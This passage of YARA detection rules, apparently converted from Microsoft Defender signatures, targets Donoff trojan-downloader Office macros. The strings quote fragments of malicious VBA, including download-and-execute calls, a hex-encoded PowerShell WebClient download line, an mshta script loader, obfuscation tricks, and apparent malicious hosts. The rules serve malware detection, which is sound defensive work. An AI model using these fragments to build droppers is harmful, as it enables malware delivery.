        $x_1_14 = "/blob?download" ascii //weight: 1
        $x_1_15 = {20 3d 20 5f 0d 0a 22 68 74 74 70 [0-1] 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_16 = {20 3d 20 22 68 74 22 20 26 20 22 74 70 [0-1] 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_17 = {20 3d 20 22 68 74 74 22 20 26 20 22 70 [0-1] 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_18 = "= \"bluefile.biz/" ascii //weight: 1
        $x_1_19 = "= \"hereurl\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_H_2147693856_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.H"
        threat_id = "2147693856"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Case 65 To 90" ascii //weight: 1
        $x_1_2 = ") Mod 26) + 65) & " ascii //weight: 1
        $x_1_3 = "Case 97 To 122" ascii //weight: 1
        $x_1_4 = ") Mod 26) + 97) & " ascii //weight: 1
        $x_1_5 = "= CreateObject(" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_H_2147693856_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.H"
        threat_id = "2147693856"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ";quui" ascii //weight: 1
        $x_1_2 = "\"C:\\Users\\Public\\Documents\"" ascii //weight: 1
        $x_1_3 = "& \"\\\" & \"calc.exe\"," ascii //weight: 1
        $x_1_4 = "Lib \"urlmon\" Alias \"URLDownloadToFileA\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_H_2147693856_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.H"
        threat_id = "2147693856"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "StdPinOk0_SPL(UserForm2.SpinButton1." ascii //weight: 1
        $x_1_2 = "= Replace(A1, A2, A3)" ascii //weight: 1
        $x_1_3 = ")) / (12 - 5))" ascii //weight: 1
        $x_1_4 = "(88 - 50 - 33), StdPinOk0_3_1," ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_H_2147693856_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.H"
        threat_id = "2147693856"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "11"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "/ (2 ^ (8 * (3 -" ascii //weight: 10
        $x_1_2 = "= 1 Then Debug.Assert Not " ascii //weight: 1
        $x_1_3 = {44 61 79 28 4e 6f 77 29 0d 0a 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74 0d 0a}  //weight: 1, accuracy: High
        $x_1_4 = {44 6f 45 76 65 6e 74 73 0d 0a 44 65 62 75 67 2e 50 72 69 6e 74 20 31 20 2f 20 30 0d 0a}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_H_2147693856_4
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.H"
        threat_id = "2147693856"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "10"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub autoopen()" ascii //weight: 1
        $x_2_2 = "+ 1: DoEvents" ascii //weight: 2
        $x_3_3 = {2e 54 65 78 74 42 6f 78 31 20 2b 20 [0-72] 2e 54 65 78 74 42 6f 78 32 20 2b 20 00 2e 54 65 78 74 42 6f 78 33 20 2b}  //weight: 3, accuracy: Low
        $x_1_4 = ", vbHide" ascii //weight: 1
        $x_3_5 = "AlelPdcsyqOeQGpr" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_H_2147693856_5
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.H"
        threat_id = "2147693856"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "+ Replace(\"sbstart.txt\", \"t\", \"e\")" ascii //weight: 2
        $x_1_2 = ", Replace(\"zpen\", \"z\", \"O\")" ascii //weight: 1
        $x_1_3 = "Replace(\"rEMP\", \"r\", \"T\"))" ascii //weight: 1
        $x_1_4 = "= Split(urlAr, \" \")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_1_*))) or
            ((1 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_H_2147693856_6
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.H"
        threat_id = "2147693856"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Replace(A1, A2, A3)" ascii //weight: 1
        $x_1_2 = {69 63 72 6f [0-3] 6f 66 74 2e 58 [0-3] 4c 48 54 54 50 [0-3] 41 64 6f 64 62 2e [0-31] 2e 41 70 70 6c 69 63 61 74 69 6f 6e [0-3] 57 [0-3] 63 72 69 70 74 2e [0-32] 50 72 6f 63}  //weight: 1, accuracy: Low
        $x_1_3 = "\"C\" And x1 <= \"Z\" And x2 = \":\")" ascii //weight: 1
        $x_1_4 = "10 - (2 + 1 + 2))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_H_2147693856_7
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.H"
        threat_id = "2147693856"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= StrReverse(\"piz.\")" ascii //weight: 1
        $x_1_2 = "\"-E\" & StrReverse(\" eliforpon-" ascii //weight: 1
        $x_1_3 = ".CopyHere((new-object -com shell.application).namespace('\" &" ascii //weight: 1
        $x_1_4 = {2e 52 75 6e 20 [0-16] 20 26 20 22 73 74 61 72 74 20 22 22 22 22 20 22 22 22 20 26}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_H_2147693856_8
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.H"
        threat_id = "2147693856"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "SavePath As String = \"AppDAta\"" ascii //weight: 1
        $x_1_2 = "FullSavePath = Environ(SavePath) & \"\\\" &" ascii //weight: 1
        $x_1_3 = ".SaveToFile FullSavePath, 2" ascii //weight: 1
        $x_1_4 = "Call Shell(FullSavePath, vbMaximizedFocus)" ascii //weight: 1
        $x_2_5 = "Chr(104) & Chr(116) & Chr(116) & Chr(112) &" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (
            ((4 of ($x_1_*))) or
            ((1 of ($x_2_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_H_2147693856_9
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.H"
        threat_id = "2147693856"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "workbook_open()" ascii //weight: 1
        $x_1_2 = "Document_Open()" ascii //weight: 1
        $x_1_3 = ".SpawnInstance_" ascii //weight: 1
        $x_1_4 = {2c 20 69 6e 74 50 72 6f 63 65 73 73 49 44 0d 0a 45 78 69 74 20 53 75 62}  //weight: 1, accuracy: High
        $x_1_5 = {52 65 70 6c 61 63 65 28 [0-32] 2c 20 22 2a 22 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_6 = {52 65 70 6c 61 63 65 28 [0-32] 2c 20 22 2c 22 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_7 = "Case Asc(\"N\") - 13 To Asc(\"Z\") - 13" ascii //weight: 1
        $x_1_8 = "Attribute VB_Name = \"ThisDocument\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (6 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_H_2147693856_10
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.H"
        threat_id = "2147693856"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {22 68 74 74 22 20 26 20 53 74 72 52 65 76 65 72 73 65 28 22 7a 2e [0-16] 2f 6d 6f 63 2e [0-31] 2f 2f 3a 70 22 29 20 26 20 22 69 70 22}  //weight: 2, accuracy: Low
        $x_2_2 = {22 25 41 50 50 22 20 26 20 53 74 72 52 65 76 65 72 73 65 28 22 65 2e [0-31] 22 29 20 26 20 22 78 65 22}  //weight: 2, accuracy: Low
        $x_1_3 = "\"-E\" & StrReverse(\" eliforpon-" ascii //weight: 1
        $x_1_4 = "\"fkwarning\" Then" ascii //weight: 1
        $x_3_5 = {4b 69 6c 6c ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? [0-47] 2e 52 75 6e 20 10 00 20 26 20 22 73 74 61 72 74 20 22 22 22 22 20 22 22 22 20 26}  //weight: 3, accuracy: Low
        $x_3_6 = {4b 69 6c 6c 20 1f 00 20 26 20 1f 00 28 02 00 29 [0-15] 2e 52 75 6e 20 52 65 70 6c 61 63 65 28 01 28 02 00 29 2c [0-31] 2c 20 00 29}  //weight: 3, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_3_*) and 2 of ($x_2_*) and 1 of ($x_1_*))) or
            ((2 of ($x_3_*) and 2 of ($x_1_*))) or
            ((2 of ($x_3_*) and 1 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_C_2147694624_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.gen!C"
        threat_id = "2147694624"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "gen: malware that is detected using a generic signature"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "#If Win64 Then" ascii //weight: 1
        $x_1_2 = "Sub Document_Open()" ascii //weight: 1
        $x_1_3 = "Environ(\"t" ascii //weight: 1
        $x_1_4 = "b = \"xe\"" ascii //weight: 1
        $x_1_5 = ".e\" & b" ascii //weight: 1
        $x_1_6 = "New MSXML2.XMLHTTP30" ascii //weight: 1
        $x_1_7 = "Open a For Binary As #" ascii //weight: 1
        $x_1_8 = ".242.123.211:88" ascii //weight: 1
        $x_1_9 = "80.242.123.2\" & \"11:888/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (7 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_I_2147695410_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.I"
        threat_id = "2147695410"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".zapto.org:" ascii //weight: 1
        $x_1_2 = {2e 52 65 73 70 6f 6e 73 65 42 6f 64 79 0d 0a 20 [0-15] 2e 53 61 76 65 54 6f 46 69 6c 65 20 28 22 43 3a 5c 57 69 6e 64 6f 77 73 5c 54 65 6d 70 5c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_I_2147695410_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.I"
        threat_id = "2147695410"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "+ \"andEn\" + \"vironmentStrings\"" ascii //weight: 1
        $x_1_2 = ", VbMethod, \"%temp%\")" ascii //weight: 1
        $x_1_3 = "\"\\warant.exe\"" ascii //weight: 1
        $x_1_4 = "= VBA.CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_5 = "\"Run\", VbMethod," ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_I_2147695410_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.I"
        threat_id = "2147695410"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "16"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Asc(Mid(" ascii //weight: 1
        $x_2_2 = "& Chr(Val(\"&H\" & Mid(" ascii //weight: 2
        $x_2_3 = "= CreateObject(Replace(\"" ascii //weight: 2
        $x_1_4 = "Sub AutoOpen()" ascii //weight: 1
        $x_2_5 = ".Language = \"jscript\"" ascii //weight: 2
        $x_4_6 = "= \"3c10064e263a15410a6a56" ascii //weight: 4
        $x_4_7 = "Public Function GrrQRnb(" ascii //weight: 4
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_I_2147695410_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.I"
        threat_id = "2147695410"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Set bwgrGUIuzi = ghWmBk1Rgc6EX4(Chr(87) & Chr(83) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116) & Chr(46) & Chr(83) & Chr(104) & Chr(101) & Chr(108) & Chr(108))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_E_2147696227_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.gen!E"
        threat_id = "2147696227"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "gen: malware that is detected using a generic signature"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "101"
        strings_accuracy = "Low"
    strings:
        $x_100_1 = {3d 20 22 22 [0-1] 2b [0-1] 22 22 [0-1] (26|2b) [0-1] 22 54 65 22 [0-1] (26|2b) [0-1] 22 6d 70 22 [0-1] (26|2b) [0-1] 22 22}  //weight: 100, accuracy: Low
        $x_100_2 = {3d 20 22 54 65 22 20 (26|2b) 20 22 6d 70 22}  //weight: 100, accuracy: Low
        $x_100_3 = {43 68 72 28 38 34 29 20 (26|2b) 20 22 65 6d 22 20 2b 20 22 70 22}  //weight: 100, accuracy: Low
        $x_100_4 = {22 55 53 45 22 [0-1] (26|2b) [0-1] 22 52 50 52 4f 46 49 4c 45 22}  //weight: 100, accuracy: Low
        $x_100_5 = {3d 20 22 22 [0-1] 26 [0-1] 22 68 74 22 [0-1] 26 [0-1] 22 74 22 [0-1] 26 [0-1] 22 70 3a 2f 2f 22 [0-1] 26 [0-1] 22 22}  //weight: 100, accuracy: Low
        $x_100_6 = {22 68 74 22 20 (26|2b) 20 22 74 22 20 (26|2b) 20 22 70 3a 2f 22 20 (26|2b) 20 22 2f 22}  //weight: 100, accuracy: Low
        $x_100_7 = "\"ht\" & \"t\" & \"\" & \"p\" & \":\" & \"//\"" ascii //weight: 100
        $x_100_8 = {3d 20 43 68 72 28 34 36 29 [0-16] 3d 20 43 68 72 28 31 30 31 29 [0-16] 3d 20 [0-16] 26 [0-16] 26 [0-1] 22 78 65 22}  //weight: 100, accuracy: Low
        $x_100_9 = {2b 20 43 68 72 28 35 30 [0-1] 2d [0-1] 34 29 [0-1] 2b [0-1] 22 76 22 [0-1] 2b [0-1] 22 22 [0-1] 2b [0-1] 22 22 [0-1] 26 [0-1] 22 62 22 [0-1] 26 [0-1] 22 22 [0-1] 26 [0-16] 26 [0-1] 22 22}  //weight: 100, accuracy: Low
        $x_1_10 = {43 44 44 44 20 3d 20 22 [0-63] 2e 74 78 74 22}  //weight: 1, accuracy: Low
        $x_1_11 = "= \"lns.txt\"" ascii //weight: 1
        $x_1_12 = "= \"kaka.txt\"" ascii //weight: 1
        $x_1_13 = {43 44 44 44 20 3d 20 22 [0-63] 22 20 2b 20 54 53 54 53}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_100_*) and 1 of ($x_1_*))) or
            ((2 of ($x_100_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_F_2147697171_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.gen!F"
        threat_id = "2147697171"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "gen: malware that is detected using a generic signature"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Chr(104) & Chr(116) & Chr(116) & Chr(112) & Chr(58)" ascii //weight: 1
        $x_1_2 = "Chr(84) & Chr(77) & Chr(80)) & Chr(47)" ascii //weight: 1
        $x_1_3 = "Shell (Environ(" ascii //weight: 1
        $x_1_4 = "Chr(112) & Chr(104) & Chr(112)" ascii //weight: 1
        $x_1_5 = "Chr(46) & Chr(101) & Chr(120) & Chr(101)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_J_2147697227_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.J"
        threat_id = "2147697227"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {42 79 70 61 53 53 20 2d 6e 6f 70 72 6f 66 69 6c 65 20 28 4e 65 77 2d 4f 62 6a 65 63 74 20 53 79 73 74 65 6d 2e 4e 65 74 2e 57 65 62 43 6c 69 65 6e 74 29 2e 44 6f 77 6e 6c 6f 61 64 46 69 6c 65 28 27 68 74 74 [0-30] 2e 70 68 70 27 2c 27 25 54 45 4d 50 25 5c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_J_2147697227_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.J"
        threat_id = "2147697227"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "dzimogosto.ru" ascii //weight: 1
        $x_1_2 = "/nkernel.exe" ascii //weight: 1
        $x_1_3 = "GetTempPath(255, sBuffer)" ascii //weight: 1
        $x_1_4 = "Shell LocalFile, vbHide" ascii //weight: 1
        $x_1_5 = "ret = URLDownloadToFile(0, HTTPfile" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_K_2147697234_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.K"
        threat_id = "2147697234"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {4c 69 62 20 22 73 68 65 6c 6c 33 32 2e 64 6c 6c 22 20 41 6c 69 61 73 20 [0-3] 22 53 68 65 6c 6c 45 78 65 63 75 74 65 41 22 20 28 42 79 56 61 6c}  //weight: 1, accuracy: Low
        $x_1_2 = {4c 69 62 20 22 75 72 6c 6d 6f 6e 22 20 41 6c 69 61 73 20 [0-3] 22 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 41 22 20 28 42 79 56 61 6c}  //weight: 1, accuracy: Low
        $x_1_3 = "Environ$(\"tmp\") & " ascii //weight: 1
        $x_1_4 = "For x = y To 1 Step -1" ascii //weight: 1
        $x_1_5 = "(\"fyf/" ascii //weight: 1
        $x_1_6 = "quui\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_K_2147697234_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.K"
        threat_id = "2147697234"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Shell \"mshta javascript:\"\"\\..\\mshtml,RunHTMLApplication \"\";GetObject(\"\"script:http:/\" + Replace(abadondend," ascii //weight: 1
        $x_1_2 = "Shell \"mshta javascript:\"\"\\..\\mshtml,RunHTMLApplication \"\";GetObject(\"\"script:http:" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_L_2147697263_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.L"
        threat_id = "2147697263"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Chr(79) & Chr(112) & Chr(101) & Chr(110)" ascii //weight: 1
        $x_1_2 = "= \"h\" & Chr(116) & " ascii //weight: 1
        $x_1_3 = "& Chr(116) & \"p\" & \":\" & Chr(47) & " ascii //weight: 1
        $x_1_4 = "\"S\" & \"e\" & Chr(110) & Chr(100)" ascii //weight: 1
        $x_1_5 = "\"r\" & \"e\" & Chr(115) & Chr(112) & Chr(111) & \"n\" & Chr(115) & Chr(101) & " ascii //weight: 1
        $x_1_6 = "\"B\" & Chr(111) & \"d\" & Chr(121)" ascii //weight: 1
        $x_1_7 = "Chr(84) & Chr(69) & \"M\" & Chr(80)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_M_2147697436_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.M"
        threat_id = "2147697436"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "httpRequest.Open Chr(71) & Chr(69) & Chr(84), Chr(104) & Chr(116) & Chr(116) & Chr(112) & Chr(58) & Chr(47) & Chr(47) & Chr(105) & Chr(115) & \"k\" & Chr(111) & Chr(107) & Chr(111)" ascii //weight: 1
        $x_1_2 = {74 65 6d 70 46 69 6c 65 20 3d 20 74 65 6d 70 46 6f 6c 64 65 72 20 2b 20 22 5c [0-16] 2e 65 78 65 22}  //weight: 1, accuracy: Low
        $x_1_3 = "tempFolder = processEnv(\"T\" & Chr(69) & Chr(77) & Chr(80))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_N_2147697622_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.N"
        threat_id = "2147697622"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {27 61 73 64 77 [0-255] 0a 53 65 74 20 [0-24] 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 ?? ?? ?? ?? ?? ?? (41|2d|5a) (41|2d|5a) [0-48] 29}  //weight: 1, accuracy: Low
        $x_1_2 = "= 1 - (Atn(20))" ascii //weight: 1
        $x_5_3 = "+ Chr(Int(121 * Rnd) + 97)" ascii //weight: 5
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_5_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_O_2147706019_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.O"
        threat_id = "2147706019"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
